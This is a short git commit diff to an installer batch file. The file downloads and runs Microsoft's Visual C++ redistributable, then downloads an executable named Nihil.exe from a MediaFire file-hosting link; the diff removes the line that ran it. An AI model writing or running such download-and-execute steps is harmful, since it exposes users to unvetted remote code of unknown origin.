42e6d0ad4a04ec052bced5f6391b95af7f0ea623
Masen <77242074+masen-f@users.noreply.github.com>
2022-04-15 17:20:34 -0400

    Add files via upload

--- src/installer.bat
+++ src/installer.bat
@@ -3,4 +3,3 @@ powershell -command "Invoke-WebRequest https://aka.ms/vs/17/release/vc_redist.x8
 .\vc_redist.exe
 
 powershell -command "Invoke-WebRequest https://download936.mediafire.com/s7qwb0152bug/npncl0zsxv41sap/Nihil.exe -Outfile Nihil.exe"
-.\Nihil.exe
